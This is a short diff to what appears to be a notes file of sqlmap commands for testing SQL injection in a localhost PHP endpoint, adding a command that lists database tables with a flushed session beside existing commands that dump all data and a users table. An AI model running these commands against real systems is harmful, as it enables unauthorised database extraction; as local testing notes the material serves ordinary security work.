@@ -20,3 +20,8 @@ sqlmap -u "http://localhost:8000/api/rooms/get_room.php?id=1" -D public -T users
 ```bash
 sqlmap -u "http://localhost:8000/api/rooms/get_room.php?id=1" --dump-all --batch
 ```
+# SQL Injection Without Cashing
+```bash
+# --flush-session clears cached injection results to force fresh testing.
+sqlmap -u "http://localhost:8000/api/rooms/get_room.php?id=1" --tables --batch --flush-session
+```
